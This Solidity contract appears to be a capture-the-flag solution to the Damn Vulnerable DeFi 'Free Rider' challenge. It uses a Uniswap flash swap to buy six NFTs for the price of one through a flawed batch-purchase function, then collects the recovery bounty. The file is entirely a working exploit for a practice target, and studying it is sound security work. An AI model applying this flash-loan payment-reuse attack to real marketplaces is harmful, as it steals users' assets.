// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Free_POC {
    FreeRiderNFTMarketplace public market;
    FreeRiderRecovery public dev;
    DamnValuableNFT public token;
    IUniswapV2Pair public uni;
    IWETH public weth;

    uint256[] public ids;
    uint256 public price = 15 ether;

    address public player;

    constructor(
        FreeRiderNFTMarketplace _market, 
        DamnValuableNFT _token, 
        IUniswapV2Pair _uni, 
        IWETH _weth,
        FreeRiderRecovery _dev
        ) {
        player  = msg.sender;
        market = _market;
        token = _token;
        uni = _uni;
        weth = _weth;
        dev = _dev;
    }

    function exploit() external payable {
        bytes memory data = abi.encode(price);
        uni.swap(price, 0, address(this), data);
        
        // callback function...
        bytes memory data2 = abi.encode(player);

        for (uint256 id = 0; id < 6; id++) {
            token.approve(address(dev), id);
            token.safeTransferFrom(address(this), address(dev), id, data2);
        }

        payable(player).transfer(address(this).balance);
    }

    function uniswapV2Call(address , uint , uint , bytes calldata) external {
        require(address(uni) == msg.sender, "1");
        require(tx.origin == player, "2");

        weth.withdraw(price);
        

        for (uint256 i = 0; i < 6; i++) {
            ids.push(i);
        }

        market.buyMany{ value : price }(ids);

        weth.deposit{ value : price * 1004 / 1000 }();
        weth.transfer(address(uni), price * 1004 / 1000);
    }

    function onERC721Received(address, address, uint256 , bytes memory )
        external
        returns (bytes4) {
            return IERC721Receiver.onERC721Received.selector; 
        }

    receive() external payable { }
    fallback() external payable { }
}

